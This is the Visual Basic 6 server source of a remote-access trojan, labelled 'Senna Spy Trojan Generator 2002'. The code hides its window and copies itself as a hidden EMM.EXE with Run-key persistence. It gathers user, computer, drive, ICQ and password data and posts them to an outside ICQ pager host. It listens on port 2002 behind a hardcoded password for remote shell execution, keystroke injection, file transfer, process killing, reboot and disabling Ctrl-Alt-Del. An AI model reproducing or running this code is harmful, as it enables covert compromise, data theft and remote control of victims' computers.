VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form FRMMAIN
   BorderStyle     =   0  'None
   ClientHeight    =   2580
   ClientLeft      =   300
   ClientTop       =   195
   ClientWidth     =   1170
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2580
   ScaleWidth      =   1170
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock WinsockTransfer
      Index = 0
      Left = 150
      Top = 1530
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.FileListBox File1
      Height = 285
      Left = 600
      TabIndex = 2
      Top = 960
      Width = 375
   End
   Begin VB.DirListBox Dir1
      Height = 315
      Left = 120
      TabIndex = 1
      Top = 960
      Width = 255
   End
   Begin VB.DriveListBox Drive1
      Height = 315
      Left = 120
      TabIndex = 0
      Top = 480
      Width = 495
   End
   Begin MSWinsockLib.Winsock SockPager 
      Left            =   120
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   327681
   End
   Begin MSWinsockLib.Winsock WinSockServer
      Index           =   0
      Left            =   600
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   327681
      Protocol        =   0
   End
End
Attribute VB_Name = "FRMMAIN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Dim hFileUploadDownload As Long

Dim nServerConnections As Integer
Dim lAudio As Boolean

Private Sub Form_Load()
   On Error Resume Next

   lAudio = (waveOutGetNumDevs() <> 0)

   Randomize
   nTrojanPort = 2002

   cICQDirectory = QueryValue( HKEY_CURRENT_USER, "SOFTWARE\Mirabilis\ICQ\DefaultPrefs\", "UIN Dir")
   If (Len(cICQDirectory) = 0) Then
      cICQDirectory = QueryValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Mirabilis\ICQ\DefaultPrefs\", "UIN Dir")
   End If

   If Right(cICQDirectory, 1) <> "\" Then
      cICQDirectory = cICQDirectory + "\"
   End If

   RegistryVerify

   nServerConnections = 0

   WinSockServer(0).LocalPort = nTrojanPort
   WinSockServer(0).Tag = False

   WinsockTransfer(0).LocalPort = nTrojanPort + 1
   WinsockTransfer(0).Tag = False

   cComputer = ""
   While True
      DoEvents

      InternLoop
   Wend
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
   RegistryVerify
End Sub

Private Sub Form_Terminate()
   RegistryVerify
End Sub

Private Sub Drive1_Change()
   On Error GoTo DriveError
   Dir1.Path = Left$(Drive1.Drive, 2) + "\"
   Exit Sub

DriveError:
   Drive1.Drive = Left$(Dir1.Path, 2)

   If Drive1.Drive = "" Then
      Drive1.Drive = Left$(cAppDirectory, 2)
   End If

   Dir1.Path = Left$(Drive1.Drive, 2) + "\"
   Exit Sub
End Sub

Private Sub Dir1_Change()
   On Error Resume Next

   File1.Path = Dir1.Path
End Sub

Private Sub InternLoop()
   On Error Resume Next

   Static lActiveBefore As Boolean
   Static lActiveNow As Boolean

   Dim cMessage As String
   Dim cSend As String
   Dim cData As String

   Dim nLoop As Integer

   lActiveBefore = lActiveNow
   lActiveNow = InternetConnected()

   If lActiveBefore And Not lActiveNow Then
      For nLoop = nServerConnections To 1 Step -1
          While WinSockServer(nLoop).State <> sckClosed
             WinSockServer(nLoop).Close
             WinsockTransfer(nLoop).Close
          Wend

          Unload WinSockServer(nLoop)
      Next

      WinsockTransfer(0).Close
      WinSockServer(0).Close

      nConexoesFiles = 0
      nServerConnections = 0

   ElseIf lActiveNow And Not lActiveBefore Then
      WinSockServer(0).Listen
      WinsockTransfer(0).Listen

      IcqSended = False

      ObtemDrives
      ICQ_UIN

      cComputer = "EXE File Name: " & App.EXEName & vbCrLf & _
                  "Operating System: " & VersaoWindows() & vbCrLf & _
                  "Time: " & Now & vbCrLf & _
                  "Trojan Port: " & CStr(2002) & vbCrLf & _
                  "UserName: " & NetUserName() & vbCrLf & _
                  "ComputerName: " & ComputerName() & vbCrLf & _
                  "Drives: " & cDrives & vbCrLf & _
                  "Type of Drives: " & cDrivesString & vbCrLf & _
                  "ICQ UINs: " & vbCrLf & cAllICQUsers & vbCrLf

      cComputer = cComputer + "Sound Card: "

      If lAudio Then
         cComputer = cComputer + "Found"& vbCrLf
      Else
         cComputer = cComputer + "Not Found"& vbCrLf
      End If

      GetPasswords

   ElseIf lActiveNow And lActiveBefore Then
      ' Internet Connection OK !

      ' Send Messages To ICQ Pager
       If Not icqSended Then
          SockPager.Close
          cMessage = ChangeSpaces( cComputer )

          cData = "from=MyNick&fromemail=mail@from.com&subject=Hi&body=" & cMessage & "&to=51964739&Send="&""

          cSend = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
          cSend = cSend & "Referer: http://wwp.mirabilis.com" & vbCrLf
          cSend = cSend & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
          cSend = cSend & "Connection: Keep-Alive" & vbCrLf
          cSend = cSend & "Host: wwp.mirabilis.com:80" & vbCrLf
          cSend = cSend & "Content-type: application/x-www-form-urlencoded"& vbCrLf
          cSend = cSend & "Content-length: " & Len(cData) & vbCrLf
          cSend = cSend & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
          cSend = cSend & cData & vbCrLf & vbCrLf & vbCrLf & vbCrLf

          SockPager.Tag = cSend
          SockPager.Connect "wwp.mirabilis.com", 80

       End If

   End If
End Sub

Sub b(Index As Integer, ByVal cCommandLine As String)
   On Error Resume Next

   Dim cRegistry As String
   Dim cFileSource As String
   Dim cFileTarget As String
   Dim cSendUploadDownload As String
   Dim cByteUploadDownload As String

   Dim cCommandCode As String
   Dim cDataReceived As String
   Dim pos%, DriveType&
   Dim cAllDrives As String
   Dim cWhatDrive As String
   Dim nLoop As Long

   Dim hSnapShot As Long
   Dim uProcess As PROCESSENTRY32
   Dim rProcess As Long
   Dim tPID As Long
   Dim tMID As Long
   Dim lExitCode As Long
   Dim hProcess As Long

   Dim cb As Long
   Dim cbNeeded As Long
   Dim NumElements As Long
   Dim ProcessIDs() As Long
   Dim cbNeeded2 As Long
   Dim NumElements2 As Long
   Dim Modules(1 To 200) As Long
   Dim lRet As Long
   Dim ModuleName As String
   Dim nSize As Long

   Dim hToken As Long
   Dim lAnswer As Long
   Dim tkp As TOKEN_PRIVILEGES
   Dim tkpOld As TOKEN_PRIVILEGES

   cCommandLine = Trim(cCommandLine)

   If cCommandLine <> "" Then
      cCommandLine = cCommandLine + " "
      cCommandCode = UCase(Left$(cCommandLine, 3))
      cDataReceived = Trim(Mid$(cCommandLine, 4, Len(cCommandLine)))

      If cCommandCode = COMMAND_CONNECT Then
         WinSockServer(Index).Tag = False
         SM Index, ANSWER_PASSWORD_TYPE
         Exit Sub
      End If

      If WinSockServer(Index).Tag = False Then
         If cCommandCode = COMMAND_PASSWORD And UCase$(cDataReceived) = "PTKPASS" Then
            WinSockServer(Index).Tag = True
            SM Index, ANSWER_CONNECTED

         Else
            WinSockServer(Index).Tag = False
            SM Index, ANSWER_PASSWORD_INVALID & "No Autorization"
         End If

      Else
         Select Case cCommandCode
            Case COMMAND_PASSWORD
               SM Index, ANSWER_OK + "Password OK"

            Case COMMAND_PROCESS_OPEN
               If lWindowsNT Then
                  cb = 8
                  cbNeeded = 96

                  Do While cb <= cbNeeded
                     cb = cb * 2
                     ReDim ProcessIDs(cb / 4) As Long

                     lRet = EnumProcesses(ProcessIDs(1), cb, cbNeeded)
                  Loop

                  NumElements = cbNeeded / 4

                  For nLoop = 1 To NumElements
                      hProcess = OpenProcess(PROCESS_QUERY_INFORMATION Or PROCESS_VM_READ, 0, ProcessIDs(nLoop))

                      If hProcess <> 0 Then
                         lRet = EnumProcessModules(hProcess, Modules(1), 200, cbNeeded2)

                         If lRet <> 0 Then
                            ModuleName = Space(MAX_PATH)
                            nSize = 500
                            lRet = GetModuleFileNameExA(hProcess, Modules(1), ModuleName, nSize)

                            SM Index, ANSWER_PROCESS_OPEN & Hex$(ProcessIDs(nLoop)) & " : " & Left(ModuleName, lRet)
                         End If
                      End If

                      lRet = CloseHandle(hProcess)
                  Next

               Else
                  hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)

                  If hSnapShot <> 0 Then
                     uProcess.dwSize = Len(uProcess)
                     rProcess = ProcessFirst(hSnapShot, uProcess)

                     Do While rProcess
                        tPID = uProcess.th32ProcessID
                        tMID = uProcess.th32ModuleID

                        SM Index, ANSWER_PROCESS_OPEN & Hex$(uProcess.th32ProcessID) & " : " & uProcess.szExeFile
                        rProcess = ProcessNext(hSnapShot, uProcess)
                     Loop

                     Call CloseHandle(hSnapShot)
                  End If
               End If

            Case COMMAND_KILL_PROCESS
               If OpenProcessToken(GetCurrentProcess(), _
                             TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken) Then

                  lAnswer = LookupPrivilegeValue(vbNullString, "SeShutdownPrivilege", tkp.Privileges(0).pLuid)

                  tkp.PrivilegeCount = 1
                  tkp.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED

                  AdjustTokenPrivileges hToken, 0, tkp, LenB(tkpOld), tkpOld, lAnswer
               End If

               hProcess = OpenProcess(PROCESS_TERMINATE, CLng(False), CLng("&h" & cDataReceived))

               If hProcess = 0 Then
                  SM Index, ANSWER_NOT_FOUND & "Process not found"
               Else
                  If TerminateProcess(hProcess, lExitCode) = 0 Then
                     SM Index, ANSWER_PROCESS_CANNOT_REMOVED & "The Process cannot eliminate"
                  Else
                     SM Index, ANSWER_OK & "Process Killed"
                  End If
               End If

            Case COMMAND_FIND_FILE, COMMAND_FIND_BITMAP, COMMAND_FIND_MULTIMEDIA
               If cDataReceived <> "" Then
                  SM Index, ANSWER_STARTING & "Wait ... Findind"
                  cAllDrives = cDrives + ";"

                  Do
                     pos% = InStr(cAllDrives, ";")
                     If pos% Then
                        cWhatDrive = Left$(cAllDrives, pos% - 1)

                        While cWhatDrive <> "" And Right(cWhatDrive, 1) <> ":"
                           cWhatDrive = Left(cWhatDrive, Len(cWhatDrive) - 1)
                        Wend

                        If cWhatDrive <> "" Then
                           cWhatDrive = cWhatDrive + "\" + Chr$(0)
                           DriveType& = GetDriveType(cWhatDrive)

                           If DriveType& = DRIVE_FIXED Or DriveType& = DRIVE_REMOTE Then
                              cWhatDrive = RemoveChr0(cWhatDrive)
                              Call SearchDirs(Index, cDataReceived, cWhatDrive, cCommandCode)
                           End If
                        End If
                     End If

                     cAllDrives = Mid$(cAllDrives, pos% + 1, Len(cAllDrives))
                  Loop Until cAllDrives = ""

                  SM Index, ANSWER_ENDING & "Find OK"
               End If

            Case COMMAND_CURRENT_DIRECTORY
               ChDir cDataReceived
               SM Index, ANSWER_CURRENT_DIRECTORY & CurDir

            Case COMMAND_RESOLUTION
               If cDataReceived = "" Then
                  IniciaResolucao Index
               Else
                  TrocaResolucao Index, Val(cDataReceived)
               End If

            Case COMMAND_SENDKEYS
               If cDataReceived <> "" Then
                  SM Index, ANSWER_OK & "Send Keys..."
                  SendKeys cDataReceived
               End If

            Case COMMAND_PLAY_WAV_AVI
               cDataReceived = UCase(cDataReceived)

               If Dir(cDataReceived) <> "" Then
                  If Right(cDataReceived, 4) = ".WAV" Then
                     If Not lAudio Then
                        SM Index, ANSWER_INVALID & "Sound Card Not Found"

                        cDataReceived = ""
                     End If
                  End If

                  If Right(cDataReceived, 4) = ".WAV" Or Right(cDataReceived, 4) = ".AVI" Then
                     SM Index, ANSWER_PLAY_WAV_AVI & "Playing"

                     xAnswer = mciSendString("close all", 0&, 0, 0)
                     xAnswer = mciSendString("open " + Chr$(34) + cDataReceived+ Chr$(34) + " alias midia", 0&, 0, 0)
                     xAnswer = mciSendString("play midia wait", 0&, 0, 0)
                     xAnswer = mciSendString("close all", 0&, 0, 0)
                  End If
               End If

            Case COMMAND_COMPUTER
               SM Index, ANSWER_COMPUTER & cComputer

            Case COMMAND_SOUND_CARD
               SM Index, ANSWER_SOUND_CARD & IIf(lAudio, "T", "F")

            Case COMMAND_RESET
               If RebootSystem() Then
                  SM Index, ANSWER_OK & "Boot OK"
               Else
                  SM Index, ANSWER_INVALID & "Not Reseted"
               End If

            Case COMMAND_HANGUP
               SM Index, ANSWER_OK & "Hanging"
               Call HangUp

            Case COMMAND_MESSAGE
               FRMMSG.Label1 = cDataReceived
               FRMMSG.Visible = True
               FRMMSG.Tag = Index
               FRMMSG.Text1.SetFocus
               FRMMSG.Show

               SM Index, ANSWER_OK & "Message OK"

            Case COMMAND_CDROM_OPEN
               xAnswer = mciSendString("set CDAudio door open", 0&, 0, 0)
               SM Index, ANSWER_OK & "CD-ROM Open"

            Case COMMAND_CDROM_CLOSE
               xAnswer = mciSendString("set CDAudio door closed", 0&, 0, 0)
               SM Index, ANSWER_OK & "CD-ROM Closed"

            ' Thanks to SG - Egypt
            Case COMMAND_DOUBLECLICK_ON
               SetDoubleClickTime 500
               SM Index, ANSWER_OK & "Double-Click On"

            Case COMMAND_DOUBLECLICK_OFF
               SetDoubleClickTime 1
               SM Index, ANSWER_OK & "Double-Click Off"

            ' Thanks to SG - Egypt
            Case COMMAND_CLIPBOARD_ON
               xAnswer = CloseClipboard
               SM Index, ANSWER_OK & "Clipboard On"

            Case COMMAND_CLIPBOARD_OFF
               xAnswer = OpenClipboard(hwnd)
               SM Index, ANSWER_OK & "Clipboard Off"

            Case COMMAND_REMOVE_SERVER
               If cDataReceived = "GyhwsmofyDiubndBzcvHlmjlrtacg" Then
                  cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                  CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
                  SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "Hjxhzludph", "", REG_SZ

                  cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
                  CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
                  SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "Godwocvpw", "", REG_SZ

                  SM Index, ANSWER_REMOVE_SERVER
                  End

               Else
                  SM Index, ANSWER_INVALID & "Error ... Server don't Removed"
               End If

            Case COMMAND_END
               ' Close Connections

            Case COMMAND_CHANGE_WALLPAPER
               If cDataReceived = "" or Dir(cDataReceived) <> "" Then
                  cCommandCode = ".Default\Control Panel\desktop"

                  CreateNewKey cCommandCode, HKEY_USERS
                  SetKeyValue HKEY_USERS, cCommandCode, "TileWallpaper", "0", REG_SZ
                  CreateNewKey cCommandCode, HKEY_USERS
                  SetKeyValue HKEY_USERS, cCommandCode, "Wallpaper", cDataReceived, REG_SZ

                  xAnswer = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, cDataReceived, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
                  SM Index, ANSWER_OK & "Changed"
               Else
                  SM Index, ANSWER_NOT_FOUND & "File Not Found"
               End If

            Case COMMAND_TASKBAR_SHOW
               xAnswer = FindWindow("Shell_traywnd", "")
               Call SetWindowPos(xAnswer, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
               SM Index, ANSWER_OK & "TaskBar Ativada"

            Case COMMAND_TASKBAR_HIDE
               xAnswer = FindWindow("Shell_traywnd", "")
               Call SetWindowPos(xAnswer, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
               SM Index, ANSWER_OK & "TaskBar Desativada"

            Case COMMAND_MOUSE_CHANGE
               SwapMouseButton (True)
               SM Index, ANSWER_OK & "Mouse OK"

            Case COMMAND_MOUSE_NORMAL
               SwapMouseButton (False)
               SM Index, ANSWER_OK & "Mouse OK"

            Case COMMAND_CTRLALTDEL_DISABLE
               DisableTaskBar
               FastTaskSwitching False
               SM Index, ANSWER_OK & "CTRL-ALT-DEL Off"

            Case COMMAND_CTRLALTDEL_ENABLE
               EnableTaskBar
               FastTaskSwitching True
               SM Index, ANSWER_OK & "CTRL-ALT-DEL On"

            Case COMMAND_CHANGE_DRIVE
               If cDataReceived = "" Then
                  Dir1.Path = Left$(Drive1.Drive, 2 ) + "\"
               Else
                  If Drive1.Drive <> cDataReceived Then
                     Drive1.Drive = left$(cDataReceived, 2) + "/"
                  End If
               End If

               DoEvents
               SM Index, ANSWER_DIRECTORY_DEFAULT & Dir1.Path

               For nLoop = 0 To Drive1.ListCount - 1
                   If UCase$(Left$(Drive1.List(nLoop), 2)) >= "C:" Then
                      SM Index, ANSWER_DRIVE & UCase$(Left$(Drive1.List(nLoop), 2))
                   End If
               Next

               If Len(Dir1.Path) > 3 Then
                  SM Index, ANSWER_DIRECTORY & Left$(Drive1.Drive, 2 ) & "\"
               End If

               SM Index, ANSWER_DIRECTORY & Dir1.Path

               For nLoop = 0 To Dir1.ListCount - 1
                   SM Index, ANSWER_DIRECTORY & Dir1.List(nLoop)
               Next
               For nLoop = 0 To File1.ListCount - 1
                   SM Index, ANSWER_FILES_NAME & File1.List(nLoop)
               Next

            Case COMMAND_CHANGE_DIRECTORY
               Dir1.Path = cDataReceived

               DoEvents
               SM Index, ANSWER_DIRECTORY_DEFAULT & Dir1.Path

               If Len(Dir1.Path) > 3 Then
                  SM Index, ANSWER_DIRECTORY & Left$(Drive1.Drive, 2 ) & "\"
               End If

               SM Index, ANSWER_DIRECTORY & Dir1.Path

               For nLoop = 0 To Dir1.ListCount - 1
                   SM Index, ANSWER_DIRECTORY & Dir1.List(nLoop)
               Next
               For nLoop = 0 To File1.ListCount - 1
                   SM Index, ANSWER_FILES_NAME & File1.List(nLoop)
               Next

            Case COMMAND_EXECUTE
               xAnswer = Shell(cDataReceived, vbNormalFocus)
               SM Index, ANSWER_OK & "OK - " & cDataReceived

            Case COMMAND_EXECUTE_HIDDEN
               xAnswer = Shell(cDataReceived, vbHide)
               SM Index, ANSWER_OK & "OK Hidden - " & cDataReceived

            Case COMMAND_EXECUTE_DOS
               SM Index, ANSWER_STARTING & "Starting"
               SM Index, ANSWER_EXECUTE_DOS & ShellGetText(cDataReceived)
               SM Index, ANSWER_ENDING & "Command OK"

            Case COMMAND_DOWNLOAD_FILE
               Call VerificaDados(cCommandLine, Index)

            Case COMMAND_READ_DOWNLOAD_FILE
               Call VerificaDados(cCommandLine, Index)

            Case Else
               SM Index, ANSWER_INVALID & "Invalid Command"
         End Select
      End If
   End If
End Sub

Private Sub WinSockServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
   On Error Resume Next
   Dim cString As String
   Dim cStringNew As String

   WinSockServer(Index).GetData cString

   If Right(cString, 1) <> Chr$(8) Then
      cString = cString + Chr$(8)
   End If

   While InStr(cString, Chr$(8)) <> 0
       cStringNew = Left( cString, InStr(cString, Chr$(8)) - 1 )
       cString = Mid( cString, InStr(cString, Chr$(8)) + 1 )

       Call b(Index, cStringNew)
   Wend
End Sub

Private Sub WinSockServer_ConnectionRequest(Index As Integer, ByVal requestID As Long)
   On Error Resume Next

   If Index = 0 Then
      nServerConnections = nServerConnections + 1
      Load WinSockServer(nServerConnections)

      WinSockServer(nServerConnections).LocalPort = 0
      WinSockServer(nServerConnections).Tag = False
      WinSockServer(nServerConnections).Accept requestID
   End If
End Sub

Public Sub SM(Index As Integer, szMsg As String, Optional SockTransferFiles As Boolean)

   On Error Resume Next

   If Not SockTransferFiles Then
       WinSockServer(Index).SendData szMsg + Chr$(8)

   Else
          WinsockTransfer(Index).SendData szMsg

   End If

   szMsg = ""
End Sub

Private Sub SockPager_Connect()
   On Error Resume Next

   SockPager.SendData SockPager.Tag
End Sub

Private Sub SockPager_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
   SockPager.Tag = ""
End Sub

Private Sub SockPager_SendComplete()
   SockPager.Tag = ""

   ICQSended = true
End Sub

Private Function ChangeSpaces(cString As String) As String
   On Error Resume Next

   Dim cChar As String
   Dim cReturn As String

   Dim nLoop As Long

   cReturn = ""

   For nLoop = 1 To Len(cString)
       cChar = Mid(cString, nLoop, 1)

       If cChar = " " Or cChar = "&" Then
          cChar = "+"
       End If

       cReturn = cReturn + cChar
   Next

   ChangeSpaces = cReturn
End Function

Public Sub RegistryVerify()
   On Error Resume Next

   dim cSourceEXE As String
   dim cTargetEXE As String
   dim cRegistry As String
   dim cArquivo As String

   cSourceEXE = UCase$(cAppDirectory & APP.EXEName & ".EXE")
   cTargetEXE = UCase(cSystemFolder & "EMM" & ".EXE")

   cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
   If QueryValue(HKEY_LOCAL_MACHINE, cRegistry, "Hjxhzludph") <> cTargetEXE Then
      CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
      SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "Hjxhzludph", cTargetEXE, REG_SZ
   End If

   cRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
   If QueryValue(HKEY_LOCAL_MACHINE, cRegistry, "Godwocvpw") <> cTargetEXE Then
      CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
      SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "Godwocvpw", cTargetEXE, REG_SZ
   End If

   cArquivo = cSystemFolder + "MSWINSCK.OCX"

   If cSourceEXE <> cTargetEXE Then
      SetAttr cTargetEXE, vbNormal
      xAnswer = CopyFile(cSourceEXE, cTargetEXE, False)
      SetAttr cTargetEXE, vbSystem + vbHidden + vbReadOnly

      SetAttr cArquivo, vbNormal
      xAnswer = CopyFile(cAppDirectory & "MSWINSCK.OCX", cArquivo, False)

      cArquivo = cSystemFolder + "MSVBVM60.DLL"
      SetAttr cArquivo, vbNormal
      xAnswer = CopyFile(cAppDirectory & "MSVBVM60.DLL", cArquivo, False)

      xAnswer = Shell(Chr(34) + cTargetEXE + Chr(34) + " " + cSourceEXE)
      End
   End If

   cSourceEXE = Trim(Command())

   If cSourceEXE <> "" Then
      While Dir(cSourceEXE) <> ""
         SetAttr cSourceEXE, vbNormal
         Kill cSourceEXE

         DoEvents
      Wend

      If RegMSWINSCK = &H0 Then
         ' OCX Register ... OK
      End If
   End If

   Exit Sub
End Sub
Private Sub WinsockTransfer_ConnectionRequest(Index As Integer, ByVal requestID As Long)

   If Index = 0 Then
      nConexoesFiles = nConexoesFiles + 1

      Load WinsockTransfer(nConexoesFiles)

      WinsockTransfer(nConexoesFiles).LocalPort = 0
      WinsockTransfer(nConexoesFiles).Accept requestID
   End If

End Sub


Private Sub WinsockTransfer_DataArrival(Index As Integer, ByVal bytesTotal As Long)

   Dim cRecebido As String

   WinsockTransfer(Index).GetData cRecebido

   If cRecebido <> Empty Then
      Call VerificaDados(cRecebido, Index)
   End If

End Sub


Private Sub WinsockTransfer_SendComplete(Index As Integer)
   bDadosEnviados = True
End Sub


Private Sub WinsockTransfer_SendProgress(Index As Integer, ByVal bytesSent As Long, ByVal bytesRemaining As Long)
   bDadosEnviados = False
End Sub
Private Sub WinsockTransfer_Close(Index As Integer)
   Call FechaArquivo
   lUploadDownload = False
End Sub
